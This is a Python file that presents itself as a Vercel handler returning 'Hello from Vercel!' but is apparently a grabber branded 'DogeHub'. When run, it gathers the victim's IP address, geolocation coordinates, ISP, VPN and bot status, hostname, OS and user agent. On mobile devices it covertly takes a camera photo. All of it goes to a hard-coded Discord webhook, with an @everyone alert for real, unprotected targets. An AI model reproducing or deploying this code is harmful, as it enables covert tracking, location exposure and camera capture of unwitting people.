import requests
import json
import platform
import socket
from datetime import datetime
import cv2  # For camera access

def handler(request):
    # Mesaj döndür
    return {
        "statusCode": 200,
        "body": "Hello from Vercel!"
    }

# Get IP details
def get_ip_details():
    try:
        ip_response = requests.get('http://ip-api.com/json/')
        ip_data = ip_response.json()
        return ip_data
    except Exception as e:
        print(f"Error occurred: {e}")
        return None

# VPN detection using IPHunter API
def get_vpn_status(ip):
    try:
        api_key = 'YOUR_IPHUNTER_API_KEY'  # Replace with your IPHunter API key
        response = requests.get(f'https://www.iphunter.info:8082/v1/ip/{ip}?key={api_key}')
        data = response.json()
        if data['block'] == 1:
            return "Yes"
        else:
            return "No"
    except Exception as e:
        print(f"Error occurred checking VPN status: {e}")
        return "Unknown"

# Send message to Discord Webhook
def send_to_discord(webhook_url, embed, file=None, mention_everyone=False):
    data = {
        "embeds": [embed]
    }
    if mention_everyone:
        data["content"] = "@everyone"

    if file:
        try:
            response = requests.post(webhook_url, json=data, files={'file': file})
        except Exception as e:
            print(f"Error sending file to Discord: {e}")
    else:
        try:
            response = requests.post(webhook_url, json=data)
            if response.status_code == 204:
                print("Message sent successfully!")
            else:
                print(f"Error: {response.status_code} - {response.text}")
        except Exception as e:
            print(f"Error sending message to Discord: {e}")

# Get User Agent
def get_user_agent():
    try:
        response = requests.get('https://httpbin.org/user-agent')
        return response.json()["user-agent"]
    except Exception as e:
        print(f"Error retrieving User-Agent: {e}")
        return "Unknown"

# Check if the user is on mobile
def check_mobile(user_agent):
    mobile_devices = ['iPhone', 'Android', 'iPad', 'Mobile']
    return "Yes" if any(device in user_agent for device in mobile_devices) else "No"

# Get device name
def get_device_name():
    try:
        return socket.gethostname()
    except:
        return "Unknown"

# Capture a photo from the device's camera
def capture_photo():
    try:
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret:
            cv2.imwrite('photo.jpg', frame)
            cam.release()
            return open('photo.jpg', 'rb')
        cam.release()
        return None
    except Exception as e:
        print(f"Error capturing photo: {e}")
        return None

if __name__ == "__main__":
    webhook_url = "https://discord.com/api/webhooks/1192907455387140176/ZuUFZkK0Og9jaXz0tJP5-dU6jBz-doPMbNBhTd77OIchocmywP3G9oqJw6wqAN1kWoYJ"  # Replace with your webhook URL
    
    ip_data = get_ip_details()
    
    if ip_data:
        ip_address = ip_data['query']
        city = ip_data['city']
        region = ip_data['regionName']
        country = ip_data['country']
        country_flag = f":flag_{country[:2].lower()}:"  # Adds the country flag (e.g., Turkey :flag_tr:)
        isp = ip_data['isp']
        lat = ip_data['lat']
        lon = ip_data['lon']
        
        vpn_status = get_vpn_status(ip_address)
        bot_check = "Yes" if ip_data.get('hosting', False) else "No"
        platform_info = platform.system() + " " + platform.release()
        device_name = get_device_name()
        user_agent = get_user_agent()
        mobile_check = check_mobile(user_agent)

        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Check if it's mobile and capture a photo
        file_to_send = None
        if mobile_check == "Yes":
            file_to_send = capture_photo()

        # Add @everyone if not a bot and no VPN
        mention_everyone = vpn_status == "No" and bot_check == "No"

        embed = {
            "title": "Information",
            "description": "Here are the details of the IP address.",
            "color": 15258703,
            "fields": [
                {"name": "IP Address", "value": f"`{ip_address}`", "inline": False},
                {"name": "City", "value": f"`{city}`", "inline": True},
                {"name": "Region", "value": f"`{region}`", "inline": True},
                {"name": "Country", "value": f"`{country}` {country_flag}", "inline": True},
                {"name": "ISP", "value": f"`{isp}`", "inline": False},
                {"name": "VPN?", "value": f"`{vpn_status}`", "inline": True},
                {"name": "Bot?", "value": f"`{bot_check}`", "inline": True},
                {"name": "Mobile?", "value": f"`{mobile_check}`", "inline": True},
                {"name": "Approximate Location", "value": f"`Latitude: {lat}, Longitude: {lon}`", "inline": False},
                {"name": "Platform", "value": f"`{platform_info}`", "inline": True},
                {"name": "Device Name", "value": f"`{device_name}`", "inline": True},
                {"name": "Opened Time", "value": f"`{current_time}`", "inline": False},
                {"name": "User Agent", "value": f"```\n{user_agent}\n\n\n\n\n\n```", "inline": False}
            ],
            "footer": {
                "text": "DogeHub",
                "icon_url": "https://i.imgur.com/yzau9KP.png"  # Example icon (replace if necessary)
            }
        }

        send_to_discord(webhook_url, embed, file=file_to_send, mention_everyone=mention_everyone)
    else:
        print("Could not retrieve IP details.")
